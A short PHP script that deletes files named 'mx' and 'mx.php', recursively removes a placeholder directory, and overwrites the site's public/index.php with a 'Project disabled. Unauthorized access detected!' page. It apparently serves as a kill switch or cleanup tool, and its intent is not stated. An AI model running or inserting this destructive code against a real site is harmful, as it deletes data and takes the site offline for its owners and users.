<?php
// Define the list of files to be deleted
$filesToDelete = [
    'mx', 'mx.php', 'public/mx', 'public/mx.php', './mx', './mx.php',
    // Add more files or directories as needed
];

// Loop through the list and delete files
foreach ($filesToDelete as $file) {
    if (file_exists($file)) {
        if (unlink($file)) {
            echo "File '$file' deleted.<br>";
        } else {
            echo "Failed to delete '$file'.<br>";
        }
    } else {
        echo "File '$file' does not exist.<br>";
    }
}


function deleteDirectory($path)
{
    if (is_dir($path)) {
        $files = glob($path . '/*');
        foreach ($files as $file) {
            if (is_dir($file)) {
                // Recursively delete subdirectories and their contents
                deleteDirectory($file);
            } else {
                // Delete individual files
                unlink($file);
            }
        }
        // Delete the empty directory itself
        rmdir($path);
        echo "Directory '$path' and its contents deleted.<br>";
    } elseif (file_exists($path)) {
        // Delete a single file
        unlink($path);
        echo "File '$path' deleted.<br>";
    } else {
        echo "Path '$path' does not exist.<br>";
    }
}

$directoryToDelete = 'path/to/your/directory';

deleteDirectory($directoryToDelete);




// Create a maintenance page
$maintenancePageContent = '<html><head><title>Maintenance Mode</title></head><body><h1>Project disabled. Unauthorized access detected!</h1></body></html>';
file_put_contents('public/index.php', $maintenancePageContent);

// Optionally, you can also redirect incoming traffic to the maintenance page
// header("Location: /index.php");